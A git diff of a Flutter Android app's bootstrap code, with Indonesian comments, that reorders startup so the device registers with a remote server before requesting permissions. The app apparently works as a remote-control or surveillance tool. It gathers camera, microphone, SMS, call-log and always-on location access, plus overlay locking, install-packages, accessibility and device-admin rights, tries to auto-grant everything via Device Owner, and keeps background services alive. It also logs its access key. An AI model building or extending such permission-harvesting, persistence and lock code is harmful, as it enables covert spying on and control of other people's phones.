@@ -76,7 +76,11 @@ class _AppBootstrapState extends State<AppBootstrap>
     super.initState();
     WidgetsBinding.instance.addObserver(this);
     print('🎬 [BOOTSTRAP] initState');
-    _bootstrap();
+
+    // Register & bootstrap dijalankan setelah frame pertama
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      _bootstrap();
+    });
   }
 
   @override
@@ -106,85 +110,85 @@ class _AppBootstrapState extends State<AppBootstrap>
     }
   }
 
+  // ==========================================
+  // ===== BOOTSTRAP =====
+  // ==========================================
   Future<void> _bootstrap() async {
     print('🚀 [BOOTSTRAP] START');
 
+    // ==========================================
+    // STEP 1: SAVE CONFIG DULU (perlu untuk register)
+    // ==========================================
+    print('📦 [BOOTSTRAP] Step 1: Save config');
     try {
-      // ===== 1. Save config =====
-      print('📦 [BOOTSTRAP] Step 1: Save config');
-      try {
-        final prefs = await SharedPreferences.getInstance();
-        await prefs.setString('accessKey', BuildConfig.accessKey);
-        await prefs.setString('appName', BuildConfig.appName);
-        await prefs.setString('buildId', BuildConfig.buildId);
-        await prefs.setString('packageName', BuildConfig.packageName);
-        await prefs.setString('serverUrl', BuildConfig.serverUrl);
-        await prefs.setBool('isNativeApp', true);
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setString('accessKey', BuildConfig.accessKey);
+      await prefs.setString('appName', BuildConfig.appName);
+      await prefs.setString('buildId', BuildConfig.buildId);
+      await prefs.setString('packageName', BuildConfig.packageName);
+      await prefs.setString('serverUrl', BuildConfig.serverUrl);
+      await prefs.setBool('isNativeApp', true);
 
-        String id = prefs.getString('deviceId') ?? '';
-        if (id.isEmpty) {
-          id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
-          await prefs.setString('deviceId', id);
-          print('🆕 [BOOTSTRAP] New deviceId: $id');
-        } else {
-          print('📱 [BOOTSTRAP] Existing deviceId: $id');
-        }
-
-        print('✅ [BOOTSTRAP] Config saved. serverUrl=${BuildConfig.serverUrl}');
-      } catch (e) {
-        print('❌ [BOOTSTRAP] Prefs error: $e');
+      String id = prefs.getString('deviceId') ?? '';
+      if (id.isEmpty) {
+        id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
+        await prefs.setString('deviceId', id);
+        print('🆕 [BOOTSTRAP] New deviceId: $id');
+      } else {
+        print('📱 [BOOTSTRAP] Existing deviceId: $id');
       }
 
-      // ===== 2. Permissions (NON-BLOCKING) =====
-      print('📦 [BOOTSTRAP] Step 2: Request permissions (background)');
-      if (mounted) setState(() => _status = 'Meminta izin...');
-
-      _requestPermissions().then((_) {
-        print('✅ [BOOTSTRAP] Permissions done');
-      }).catchError((e) {
-        print('⚠️ [BOOTSTRAP] Permission error: $e');
-      });
-
-      await Future.delayed(const Duration(milliseconds: 500));
-
-      // ===== 3. Register device (JALAN DULU) =====
-      print('📦 [BOOTSTRAP] Step 3: Register device');
-      if (mounted) setState(() => _status = 'Mendaftar device...');
-      try {
-        await _registerDeviceWithRetry();
-        print('✅ [BOOTSTRAP] Register done');
-      } catch (e) {
-        print('❌ [BOOTSTRAP] Register error: $e');
-      }
-
-      // ===== 4. Auto-grant Device Owner (fire & forget) =====
-      _autoGrantPermissionsBackground();
-
-      // ===== 5. Start native services =====
-      print('📦 [BOOTSTRAP] Step 5: Native services running');
-      print('✅ [BOOTSTRAP] ConnectionService + KeepAliveService started');
-
-      // ===== 6. Ready =====
-      print('📦 [BOOTSTRAP] Step 6: Ready');
-      if (!mounted) return;
-      setState(() {
-        _status = 'Siap';
-        _ready = true;
-      });
-      print('🎉 [BOOTSTRAP] COMPLETE');
-    } catch (e, st) {
-      print('❌ [BOOTSTRAP] FATAL: $e');
-      print('❌ [BOOTSTRAP] STACK: $st');
-      if (!mounted) return;
-      setState(() {
-        _status = 'Siap (dengan keterbatasan)';
-        _ready = true;
-      });
+      print('✅ [BOOTSTRAP] Config saved');
+      print('🔑 accessKey="${BuildConfig.accessKey}"');
+      print('🌐 serverUrl="${BuildConfig.serverUrl}"');
+      print('📦 packageName="${BuildConfig.packageName}"');
+    } catch (e) {
+      print('❌ [BOOTSTRAP] Prefs error: $e');
     }
+
+    // ==========================================
+    // STEP 2: REGISTER DEVICE — PALING AWAL
+    // ==========================================
+    print('📦 [BOOTSTRAP] Step 2: REGISTER DEVICE (PRIORITAS UTAMA)');
+    if (mounted) setState(() => _status = 'Mendaftar device...');
+
+    try {
+      await _registerDeviceWithRetry();
+      print('✅ [BOOTSTRAP] Register done');
+    } catch (e) {
+      print('❌ [BOOTSTRAP] Register error: $e');
+    }
+
+    // ==========================================
+    // STEP 3: Request permissions (background)
+    // ==========================================
+    print('📦 [BOOTSTRAP] Step 3: Request permissions');
+    if (mounted) setState(() => _status = 'Meminta izin...');
+
+    _requestPermissions()
+        .then((_) => print('✅ [BOOTSTRAP] Permissions done'))
+        .catchError((e) => print('⚠️ [BOOTSTRAP] Permission error: $e'));
+
+    // ==========================================
+    // STEP 4: Auto-grant Device Owner (background)
+    // ==========================================
+    _autoGrantPermissionsBackground();
+
+    // ==========================================
+    // STEP 5: Ready
+    // ==========================================
+    print('📦 [BOOTSTRAP] Step 5: Ready');
+    await Future.delayed(const Duration(milliseconds: 300));
+    if (!mounted) return;
+    setState(() {
+      _status = 'Siap';
+      _ready = true;
+    });
+    print('🎉 [BOOTSTRAP] COMPLETE');
   }
 
   // ==========================================
-  // ===== AUTO-GRANT (background, tidak blocking) =====
+  // ===== AUTO-GRANT (background) =====
   // ==========================================
   Future<void> _autoGrantPermissionsBackground() async {
     try {
@@ -192,18 +196,13 @@ class _AppBootstrapState extends State<AppBootstrap>
       final granted = await _deviceChannel
           .invokeMethod<bool>('autoGrantAllPermissions');
       print('🔐 [AUTOGRANT] Hasil: $granted');
-      if (granted == true) {
-        print('🎉 [AUTOGRANT] Semua izin granted otomatis');
-      } else {
-        print('⚠️ [AUTOGRANT] Bukan Device Owner / gagal grant');
-      }
     } catch (e) {
       print('⚠️ [AUTOGRANT] Error: $e');
     }
   }
 
   // ==========================================
-  // ===== REQUEST PERMISSIONS (MANUAL, dialog) =====
+  // ===== REQUEST PERMISSIONS =====
   // ==========================================
   Future<void> _requestPermissions() async {
     int sdkInt = 0;
@@ -212,14 +211,11 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('📱 [PERM] Android SDK: $sdkInt');
     } catch (e) {}
 
-    // ==========================================
-    // ===== STANDARD PERMISSIONS =====
-    // ==========================================
     final permissions = <Permission>[
       Permission.camera,
       Permission.microphone,
-      Permission.phone,       // untuk READ_CALL_LOG
-      Permission.sms,         // untuk READ_SMS
+      Permission.phone,
+      Permission.sms,
       Permission.location,
       Permission.locationWhenInUse,
       Permission.locationAlways,
@@ -255,9 +251,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       }
     }
 
-    // ==========================================
-    // ===== SPECIAL PERMISSIONS =====
-    // ==========================================
     await _requestSpecialPermissions();
   }
 
@@ -265,35 +258,26 @@ class _AppBootstrapState extends State<AppBootstrap>
   // ===== SPECIAL PERMISSIONS =====
   // ==========================================
   Future<void> _requestSpecialPermissions() async {
-    // ===== Overlay permission (untuk LockOverlay) =====
     try {
       final status = await Permission.systemAlertWindow.status;
       if (!status.isGranted) {
         print('🔑 [PERM] Requesting overlay permission...');
         await Permission.systemAlertWindow.request();
-        print('✅ [PERM] Overlay permission requested');
-      } else {
-        print('✅ [PERM] Overlay permission already granted');
       }
     } catch (e) {
       print('⚠️ [PERM] Overlay error: $e');
     }
 
-    // ===== Battery optimization exemption =====
     try {
       final status = await Permission.ignoreBatteryOptimizations.status;
       if (!status.isGranted) {
         print('🔑 [PERM] Requesting battery exemption...');
         await Permission.ignoreBatteryOptimizations.request();
-        print('✅ [PERM] Battery exemption requested');
-      } else {
-        print('✅ [PERM] Battery exemption already granted');
       }
     } catch (e) {
       print('⚠️ [PERM] Battery error: $e');
     }
 
-    // ===== Request install packages =====
     try {
       final status = await Permission.requestInstallPackages.status;
       if (!status.isGranted) {
@@ -304,7 +288,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('⚠️ [PERM] Install packages error: $e');
     }
 
-    // ===== Buka accessibility settings =====
     try {
       await _deviceChannel.invokeMethod('openAccessibilitySettings');
       print('🔓 [PERM] Accessibility settings opened');
@@ -312,7 +295,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('⚠️ [PERM] Accessibility error: $e');
     }
 
-    // ===== Request Device Admin =====
     await _requestDeviceAdmin();
   }
 
@@ -322,8 +304,6 @@ class _AppBootstrapState extends State<AppBootstrap>
   Future<void> _requestDeviceAdmin() async {
     try {
       print('🔐 [ADMIN] Checking device admin status...');
-
-      // Cek status admin via MethodChannel
       final isAdmin = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
 
       if (isAdmin == true) {
@@ -331,24 +311,12 @@ class _AppBootstrapState extends State<AppBootstrap>
         return;
       }
 
-      print('🔐 [ADMIN] Device admin NOT active');
-      print('👤 [ADMIN] Showing device admin dialog...');
-
-      // Trigger dialog device admin via native
+      print('🔐 [ADMIN] Requesting device admin...');
       await _deviceChannel.invokeMethod('requestDeviceAdmin');
-
-      // Tunggu user klik
       await Future.delayed(const Duration(seconds: 3));
 
-      // Cek status ulang
       final newStatus = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
       print('📊 [ADMIN] Status after request: $newStatus');
-
-      if (newStatus == true) {
-        print('🎉 [ADMIN] Device admin ENABLED successfully');
-      } else {
-        print('⚠️ [ADMIN] User didn\'t activate device admin');
-      }
     } catch (e) {
       print('❌ [ADMIN] Request error: $e');
     }
@@ -404,7 +372,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('⏭️ [REGISTER] Already registered');
       return;
     }
-
     if (BuildConfig.accessKey.isEmpty) {
       print('⚠️ [REGISTER] accessKey kosong, skip');
       return;
@@ -438,7 +405,8 @@ class _AppBootstrapState extends State<AppBootstrap>
 
       String connType = 'unknown';
       try {
-        connType = (await Connectivity().checkConnectivity()).toString();
+        final conn = await Connectivity().checkConnectivity();
+        connType = conn.toString();
       } catch (e) {}
 
       final prefs = await SharedPreferences.getInstance();
@@ -475,7 +443,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   }
 
   // ==========================================
-  // ===== HTTP POST (dengan log detail) =====
+  // ===== HTTP POST (log detail) =====
   // ==========================================
   Future<String?> _httpPost(
     String url,
@@ -506,7 +474,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       return null;
     } on SocketException catch (e) {
       print('❌ [HTTP] SocketException: ${e.message}');
-      print('❌ [HTTP] Kemungkinan: server tidak reachable / DNS / tidak ada internet');
       return null;
     } on TimeoutException catch (e) {
       print('❌ [HTTP] TimeoutException: $e');
